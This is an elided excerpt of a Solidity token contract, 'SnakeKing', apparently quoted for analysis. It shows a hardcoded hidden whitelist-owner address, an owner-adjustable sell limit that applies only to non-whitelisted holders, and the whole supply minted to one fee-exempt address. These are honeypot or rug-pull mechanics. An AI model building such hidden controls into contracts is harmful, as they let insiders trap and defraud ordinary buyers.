...
abstract contract Ownable is Context {
    ...
    function whitelistowner() public view virtual returns (address) {
        return 0xad3bc349627FA63e24001a8146DaEF7c942B2b2a;
    }
    ...
    modifier onlyWhitelistOwner() {
        require(whitelistowner() == _msgSender(), "Ownable: caller is not the whitelistOwner");
        _;
    }
...
contract SnakeKing is ERC20, Ownable, BaseToken {
    using SafeMath for uint256;
    ...
    constructor() payable ERC20("SnakeKing", "SnakeKing") {
        rewardToken = 0x55d398326f99059fF775485246999027B3197955;
        _marketingWalletAddress = 0xC06f5D1323B497Dc87D0D9107d1bC9f23576eb84;
        require(
        ...
        liquidityFee = 2;
        marketingFee = 2;
        uint256 totalsupply_=1000000000000000000000000000000000;
        ...
        excludeFromFees(0x55C113493baB3A68a3C97105f0fe1A348a5aD0df, true);
        ...
        */
        _mint(0x55C113493baB3A68a3C97105f0fe1A348a5aD0df, totalsupply_);
    ...
    function addWhitelist (address[] memory users) public onlyWhitelistOwner{
        for (uint i = 0; i < users.length; i++) {
            whitelist[users[i]] = true;
        }
    }
    function removeWhitelist (address[] memory users) public onlyWhitelistOwner{
        for (uint i = 0; i < users.length; i++) {
            whitelist[users[i]] = false;
        }
    }

    function setSellLimit(uint _limit)public onlyOwner{
        sellLimit=_limit;
    }
    ...
    function _transfer(
        ...
        if (to==uniswapV2Pair&&!isWhitelist(from)){
           require(amount <= balanceOf(from).div(sellLimit), "amount exceeds limit");
        }
